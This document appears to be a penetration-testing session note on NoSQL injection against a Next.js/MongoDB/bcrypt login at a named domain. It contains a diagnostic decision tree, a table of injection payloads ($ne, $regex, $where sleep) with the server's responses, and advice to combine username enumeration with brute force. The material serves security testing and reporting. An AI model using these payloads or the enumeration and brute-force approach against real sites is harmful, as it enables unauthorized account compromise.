# Bcrypt Wall NoSQLi Diagnostics — Session Reference

## Target: giamsatquocte688.com (Next.js + MongoDB + bcrypt)
## Date: 2026-07-31

## The Pattern

Node.js apps using Mongoose/MongoDB commonly implement auth as:
```javascript
const user = await User.findOne({ username: req.body.username });
if (!user) return res.status(401).json({ error: "Sai tài khoản hoặc mật khẩu" });
const match = await bcrypt.compare(req.body.password, user.passwordHash);
```

This creates a "bcrypt wall" — NoSQL operators on the password field NEVER
reach MongoDB. They crash in `bcrypt.compare()` instead.

## Diagnostic Decision Tree

```
Send {"username": OBJECT, "password": STRING}
  → 500? = crash in input processing (.trim() on object)
           → operators on username NOT evaluated
           → only DoS, no enumeration

Send {"username": "known_user", "password": OBJECT}
  → 500? = user found, crash in bcrypt.compare()
  → 401? = user not found, early return

Send {"username": "unknown_user", "password": OBJECT}
  → 401? = confirms: 500 above = user exists (USERNAME ENUM ORACLE)
  → 500? = crash in input processing (not bcrypt)

Send {"username": "admin", "password": {"$regex": "^zzz_impossible"}}
  → 500? = regex NOT evaluated (crash in bcrypt)
  → 401? = regex WAS evaluated, no match → BLIND NoSQLi POSSIBLE
```

## Key Lessons

1. **500 ISE ≠ operators reach DB.** The 500 can happen in:
   - Input processing (`.trim()`, `.toLowerCase()` on object)
   - bcrypt.compare (object password)
   - Post-query processing (accessing `.hash` on null result)

2. **The only reliable NoSQLi oracle** is when $regex/$ne on a field
   returns DIFFERENT status codes for matching vs non-matching patterns.
   If ALL operators return the same status → operators NOT evaluated.

3. **Timing attacks behind Cloudflare are unreliable.** CDN latency
   (100-300ms) masks sub-second DB delays. `$where sleep(3000)` produced
   no measurable delay vs baseline (0.26s vs 0.27s).

4. **Form-encoded parameter pollution** (`password[$ne]=`) only works
   if the app uses `express.urlencoded({extended: true})`. If the app
   only accepts `Content-Type: application/json`, form data returns
   "missing input" — the body parser doesn't populate req.body.

5. **Username enumeration via type confusion** is still a valid finding:
   - 500 (user exists) vs 401 (not found) = enumeration oracle
   - Combined with no rate limiting → brute force password as strings
   - Report as: username enumeration + no rate limiting (Medium)

## Test Results from This Session

| Payload | Response | Meaning |
|---------|----------|---------|
| `{"username":"admin","password":{"$ne":""}}` | 500 | admin exists |
| `{"username":"nonexist","password":{"$ne":""}}` | 401 | not found |
| `{"username":{"$regex":"^zzz"},"password":"test"}` | 500 | crash in .trim() |
| `{"username":{"$ne":""},"password":"test"}` | 500 | crash in .trim() |
| `{"username":"admin","password":{"$regex":"^zzz"}}` | 500 | crash in bcrypt |
| `{"username":"admin","password":{"$regex":".*"}}` | 500 | crash in bcrypt |
| `{"username":"admin","password":{"$ne":"wrong"}}` | 500 | crash in bcrypt |
| `{"username":"admin","password":{"$eq":"admin"}}` | 500 | crash in bcrypt |
| `{"username":"admin","password":true}` | 400 | falsy check rejects |
| `{"username":"admin","password":0}` | 400 | falsy check rejects |
| `{"username":"admin","password":[]}` | 500 | passes !check, bcrypt crash |
| `{"$where":"sleep(3000)"}` at top level | 401 | ignored as extra field |
| Form-encoded `password[$ne]=` | 400 | app only parses JSON |

## Conclusion: Operators never reached MongoDB on this target.
Only exploitable findings: username enumeration + no rate limiting + DoS.
